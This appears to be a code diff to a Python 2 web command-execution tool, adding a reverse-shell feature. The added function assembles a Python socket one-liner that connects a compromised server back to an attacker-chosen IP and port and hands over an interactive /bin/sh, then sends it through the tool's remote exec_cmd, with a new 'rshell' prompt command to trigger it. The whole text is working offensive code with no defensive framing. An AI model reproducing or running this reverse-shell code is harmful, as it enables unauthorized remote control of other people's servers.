@@ -49,6 +49,23 @@ def exec_cmd(cmd, base_url, post):
   return result
 
 
+def reverse_shell(shell, ip, port, base_url, post):
+  cmd = ""
+  if shell == "python":
+    cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("
+    cmd += '"' + ip + '"'
+    cmd += "," + port
+    cmd += "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
+    cmd += """p=subprocess.call(["/bin/sh","-i"]);'"""
+  else:
+    print "Unknown shell '%s'" % shell
+    return
+
+  print cmd
+
+  exec_cmd(cmd, base_url, post)
+
+
 def upload_file(f, base_url, post):
   out = "/tmp/up"
   file = open(f, 'r')
@@ -104,12 +121,19 @@ readline.parse_and_bind('set editing-mode vi')
 
 # Let's root it
 print "Type 'exit' to quit."
+print "Type 'rshell' to get a reverse shell."
 
 while True:
   cmd = raw_input("cmd> ")
 
   if cmd.lower() == 'exit':
     sys.exit(2)
+  elif cmd.lower() == 'rshell':
+    shell = raw_input("python ")
+    ip = raw_input("ip ");
+    port = raw_input("port ");
+    reverse_shell(shell, ip, port, base_url, post)
+    continue
 
   result =  exec_cmd(cmd, base_url, post)
 
